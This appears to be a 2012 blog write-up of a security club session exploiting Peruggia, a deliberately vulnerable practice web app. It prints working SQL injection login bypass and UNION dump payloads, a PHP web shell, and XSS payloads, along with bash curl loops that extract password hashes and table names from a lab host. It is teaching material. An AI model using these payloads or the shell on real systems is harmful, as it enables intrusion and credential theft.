---
author: pralz
comments: true
date: 2012-09-26 19:49:18+00:00
layout: post
slug: peruggia-writeup
title: Peruggia Writeup
wordpress_id: 181
categories:
- Meeting Re-caps
---

Kris and I did some 'pair hacking' on peruggia at this week's meeting, and here are the things we came up with._** Lots of spoilers below.**_


# Logging in


Right off the bat, we were able to login as username: admin, password: admin. From there we could make/delete users, change passwords, upload/delete stuff and all those good admin-y type things.

Were it not the case that the admin password was so easy to guess, we also found an** SQL injection vulnerability in the username field**. The source for the query looks like:

[code]$creds = mysql_query("SELECT * FROM users WHERE username='".$_POST['username']."' AND password='".md5($_POST['password'])    ."'", $conx);[/code]

As you can see, _$_POST['username']_ is inserted into the query without any sanitizing, so entering a username such as:

[code]a' || 1=1 --%20[/code]

(**important**: there should be a space at the end of the string, but wordpress chops it off - substituted %20)
will cause the resulting query to be:

[code]SELECT * FROM users WHERE username='a' || 1=1 -- ' AND password='".md5($_POST['password'])    ."'"[/code]

and will always evaluate to true. Since admin is the first user in the db and thus the first row returned, it will log you in as admin!


# Getting shell and source


Once logged in we were able to upload pictures. The uploader is insecure though and allowed us to upload a php script instead of an image. And it uploads into the _/images/_ directory, which is publicly readable, so we could visit the script url and get output. Here's the script we used:

[code]<?php
 echo system($_GET['foo']);
 ?>[/code]

Getting shell was just that easy! Now by setting the foo parameter we could run arbitrary commands on the server (as the current user, which was www-data). For instance, if your uploaded file was called bar.php, visiting

[code]/images/bar.php?foo=ls[/code]

will give you the output of ls on the server. We wanted the source, so we did

[code]/images/bar.php?foo=tar+zvcf+../src.tar+../.[/code]

which tar'd up the entire parent directory (which has the whole website source code) and left it readable to be downloaded.

(As a note here, since the app thought our script was a picture, other people were able to delete it with the click of a button on the admin page. This got annoying quick so we used our script to call mv on itself and moved it to a location where it wasn't so easy to delete).

After getting the source it was **ezmode** since it's littered with different vulnerabilities that are free for the taking. Here are a few we found and exploited:
* XSS on the comments. Make a comment with the text

[code]<script>alert('lolol')</script>[/code]

and it will run on the page of whoever visits, because the comments are being inserted into the html without any sanitizing.

* The "learn" page had a XSS vuln on the _type_ parameter in the url, as well as an RFI (remote file include) vuln on the _paper_ parameter. If you put the url of a php script in the paper parameter it will be included on the page.


# Reading the whole db!


For my favorite of the night, we used the source to find that the _pic_id_ parameter for the comments page was being inserted directly into an SQL statement, and thus we were able to inject into it. However, unlike the login SQL injection which simply logged us in, this injection displayed information from it's query onto the page. As a result we can _UNION_ to a query that we craft to return anything from the database. SQL _UNION_ will only work if the result from both queries has the same number of columns, so we had to first pad our crafted query until we got it right.
A benign request to the page looks like

[code]/index.php?action=comment&pic_id=1[/code]

So we did this: _/index.php?action=comment&pic_id=1+union+select+1+from+users+--+_

but our 1 didn't show up on the page. Trying _/index.php?action=comment&pic_id=1+union+select+1,1+from+users+--+_ still got nothing. We continued in this fashion until

[code]/index.php?action=comment&pic_id=1+union+select+1,1,1,1+from+users+--+[/code]

yielded a 1 (under the uploaded by area?) where it had before been nothing. Success! We now knew the **query was expecting 4 columns to be returned** and that the fourth  is being output right onto the page. With a small guess on the column name it wasn't much a jump to get

[code]/index.php?action=comment&pic_id=1+union+select+1,1,1,password+from+users+--+[/code]

which displayed the password (md5 hashed) for the first user in the db. It was the admin password hash, so with a quick google search the password was found ;)

This only works if the first user in the db is the only password hash you want, but we got greedy and decided we wanted them **all**. To accomplish this we used the _LIMIT_ and _OFFSET_ SQL commands as such:

[code]/index.php?action=comment&pic_id=1+union+select+1,1,1,password+from+users+limit+1+offset+0+--+[/code]

By changing the offset number, you can get any row returned by the query.

Of course if the database had hundreds or more users this would take a long time by hand, so Kris suggested we write a script to dump all the rows for us, which we did as a bash one liner.

[code]for X in {0..200}; do curl -s "http://192.168.1.100/peruggia/index.php?action=comment&pic_id=1+UNION+SELECT+1,1,1,password+from+users+LIMIT+1+OFFSET+$X+--+" | grep Uploaded;  done[/code]

What this does is cycle through the provided range which changes the $X we have at the end of the query string for the offset. curl will return the entire page from the http request (the -s is for silent) and pipe it into grep where we're looking for the relevant line of the page source (the uploaded by part where the password will be dumped).

Using this same one liner with a slightly tweaked SQL statement you can dump whatever you want in the db. For instance, if you wanted to know the name of all the tables that exist you can do something like

[code]for X in {0..200}; do curl -s "http://192.168.1.100/peruggia/index.php?action=comment&pic_id=1+UNION+SELECT+1,1,1,table_name+from+information_schema.tables+LIMIT+1+OFFSET+$X+--+" | grep Uploaded;  done[/code]

which will dump all the table names from the meta table called information_schema.

Now you should be a pro, so go download peruggia and try this stuff yourself!

pralz
